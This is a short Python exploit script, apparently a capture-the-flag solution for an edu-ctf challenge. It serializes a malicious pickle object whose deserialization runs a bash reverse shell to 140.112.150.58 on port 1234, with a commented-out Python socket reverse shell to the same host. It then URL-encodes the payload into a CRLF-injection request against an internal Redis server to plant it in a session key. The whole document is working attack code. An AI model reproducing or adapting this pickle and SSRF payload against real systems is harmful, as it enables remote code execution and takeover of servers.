import pickle
import os
import urllib.parse
import urllib.request

class Shell(object):
    def __reduce__(self):
        #a = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("140.112.150.58",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
        a = "bash -c 'bash -i >& /dev/tcp/140.112.150.58/1234 0>&1'"
        return (os.system,(a,))    

# serialize reverse shell
shell = Shell()
result = str(pickle.dumps(shell))[1:]   # serialize and remove b''
print(result)

# url format
url = 'https://edu-ctf.csie.org:10163/'
shell_url = urllib.parse.quote(result)
final_url = 'http://redis:6379/?q=HTTP/1.1%0D%0ASET"session:4c9ed145-a263-4b2d-82cc-30829f236c76"'+shell_url+'%0D%0A'
print(final_url)
#req = urllib.request.Request(url,data=final_url)
